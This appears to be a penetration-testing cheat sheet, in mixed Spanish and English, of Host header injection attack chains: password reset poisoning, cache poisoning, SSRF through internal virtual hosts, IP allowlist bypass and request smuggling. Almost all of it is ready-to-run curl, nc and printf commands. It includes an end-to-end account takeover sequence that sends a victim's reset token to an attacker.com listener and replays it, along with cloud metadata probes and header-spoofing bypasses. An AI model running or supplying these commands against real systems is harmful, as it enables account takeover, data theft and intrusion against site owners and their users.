---
aliases:
  - HHI Chains
  - Password Reset Poisoning Chain
  - Host Header HRS Combo
tags:
  - vuln/host-header-injection
  - technique/lateral-movement
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Host Header Injection]]"
  - "[[Web Cache Poisoning]]"
  - "[[HTTP Request Smuggling]]"
  - "[[Server-Side Request Forgery (SSRF)]]"
---
# Host Header Injection - Chains y Variantes

***

## Password Reset Poisoning Chain

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST -H "Host: target.com" -H "X-Forwarded-Host: attacker.com" -d "email=victim@target.com" https://target.com/forgot` | Reset email link a attacker.com | Backend trusts XFH. |
| `nc -lvnp 443` en attacker.com → recibir `GET /reset?token=...` | Listener captura token | Setup phishing. |
| `curl https://target.com/reset?token=$STOLEN -d "password=ATK"` | Replay token contra legit endpoint | Final ATO step. |
| `curl -X POST -H "X-Forwarded-Host: taken.target.com" -d "email=victim@target.com" https://target.com/forgot` | Subdomain takeover combo — link parece más legit | Wildcard cookie + SDT. |
| `curl -X POST -H "Forwarded: host=attacker.com" -d "email=victim" https://target.com/forgot` | RFC 7239 Forwarded variant | Modern apps. |
| `curl -X POST -H "X-Original-Host: attacker.com" -d "email=victim" https://target.com/forgot` | Custom override header | Per-app variants. |
| `for h in 'X-Forwarded-Host' 'X-Host' 'X-Forwarded-Server' 'Forwarded'; do curl -X POST -H "Host: target.com" -H "$h: attacker.com" -d "email=victim@target.com" https://target.com/forgot; done` | Bulk header probe | Discovery automation. |
^hhi-chain-reset

### Reset poisoning end-to-end

```bash
# 1. Setup listener
nc -lvnp 443

# 2. Trigger reset poisoning
curl -X POST -H "Host: target.com" -H "X-Forwarded-Host: attacker.com" \
  -d "email=victim@target.com" https://target.com/forgot

# 3. Email arrives a victim:
# "Click to reset: https://attacker.com/reset?token=eyJ..."

# 4. Victim clicks → atacante recibe en listener:
# GET /reset?token=eyJ...

# 5. Atacante replay contra legit
curl https://target.com/reset?token=eyJ... -d "password=ATTACKER_PASS"

# 6. ATO complete — login con ATTACKER_PASS
```

___

## Cache Poisoning Combo

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -H "X-Forwarded-Host: attacker.com" "https://target.com/?cb=$(date +%s)"` | Pre-poison probe con cache bust | Pre-attack check. |
| `curl -H "X-Forwarded-Host: attacker.com" https://target.com/login` (cache hit) | Cache stores `<base href="//attacker.com">` | Mass victim asset rerouting. |
| `curl -sI -H "X-Forwarded-Host: x" https://target/x \| grep -iE 'cf-cache-status\|x-cache\|age:'` | Verificar cache hit post-injection | Cache confirmation. |
| Burp → Param Miner → Right-click → "Guess headers" | Detecta unkeyed inputs | Discovery automation. |
| `curl -H "X-Forwarded-Host: attacker.com" -H "Pragma: x-get-cache-key" https://target/?cb=$(date +%s)` | Cloudflare/Akamai cache key debug | Header-based debug. |
| Post-poison: `curl https://target.com/login` (víctima común) → recibe response con attacker.com | Mass impact verification | Cache TTL window. |
| `curl -sI -H "X-Forwarded-Host: attacker.com" https://target/feed.rss` | RSS feed self-link poison | Feed reader rerouting. |
^hhi-chain-cache

___

## Internal SSRF via Virtual Host Routing

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -H "Host: admin.internal" https://target.com/` | Internal admin vhost expose | Server routes by Host. |
| `curl -H "Host: api.internal" https://target.com/` | Internal API expose | Multi-vhost server. |
| `curl -H "Host: jenkins.internal" https://target.com/` | Jenkins panel | Common DevOps tool. |
| `curl -H "Host: gitlab.internal" https://target.com/` | GitLab via Host | Internal repo. |
| `curl -H "Host: kibana.internal" https://target.com/` | Kibana via Host | ELK stack. |
| `curl -H "Host: localhost" https://target.com/admin` | Localhost-trust admin bypass | Trust-based ACL. |
| `for h in admin api jenkins gitlab kibana grafana prometheus minio s3 dev staging localhost 127.0.0.1; do curl -sI -H "Host: $h" https://target.com/ \| head -3; done` | Bulk internal vhost probe | Discovery. |
| `curl -H "Host: 169.254.169.254" https://target.com/latest/meta-data/` | Cloud metadata routing | If routed by Host. |
^hhi-chain-ssrf

___

## Authentication / IP Allowlist Bypass

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/admin` | IP allowlist bypass | App trusts XFF para internal access. |
| `curl -H "X-Real-IP: 127.0.0.1" https://target.com/admin` | nginx-style IP bypass | nginx-fronted. |
| `curl -H "Host: admin.internal" https://target.com/admin` | Trusted Host bypass auth | Internal Host = no auth. |
| `curl -H "Cf-Connecting-IP: 127.0.0.1" https://target.com/admin` | Cloudflare IP spoof | CF no strip header. |
| `curl -H "X-Custom-IP-Authorization: 127.0.0.1" https://target.com/admin` | Atlassian/Confluence CVE | Confluence apps. |
| `curl -H "Host: target.com" -H "X-Forwarded-Host: admin.internal" https://target.com/admin` | XFH-based ACL bypass | Backend ACL on XFH. |
| `for h in 'X-Forwarded-For' 'X-Real-IP' 'True-Client-IP' 'Cf-Connecting-IP' 'Cluster-Client-IP' 'X-Originating-IP'; do curl -sI -H "$h: 127.0.0.1" https://target.com/admin \| head -1; done` | Bulk IP-spoof header probe | Discovery. |
^hhi-chain-auth

___

## HTTP Request Smuggling Combo

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: internal.target\r\n\r\n' \| ncat target 80` | CL.TE smuggle con Host injection en smuggled request | HRS + HHI. |
| Burp HTTP Request Smuggler extension → "Detect" → choose CL.TE → modify smuggled Host | Auto-detect HRS + manual Host injection | Tooling. |
| `curl --http2 ... -H ":authority: target.com" -H "Host: attacker.com"` (H2 → H1 downgrade) | H2 desync con :authority vs Host | Modern chain. |
| Smuggle reset poisoning: `POST /forgot ...` con XFH attacker en smuggled | ATO via HRS + HHI | Compound chain. |
| Smuggle cache poison: `GET / ...` con XFH attacker en smuggled → cached | Mass cache poison | Critical chain. |
^hhi-chain-hrs

***
